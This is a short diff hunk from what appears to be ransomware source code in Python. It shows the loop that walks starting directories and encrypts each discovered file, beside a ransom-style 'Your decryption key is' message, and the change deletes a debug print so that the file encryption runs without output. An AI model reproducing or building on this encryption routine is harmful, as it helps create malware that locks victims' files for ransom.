@@ -105,7 +105,6 @@ Your decryption key is: '{}'
 
     for currentDir in startdirs:
         for file in discoverFiles(currentDir, decrypt):
-            print(file)
             modifyFile(file, crypt.encrypt, decrypt)
 
     if not decrypt:
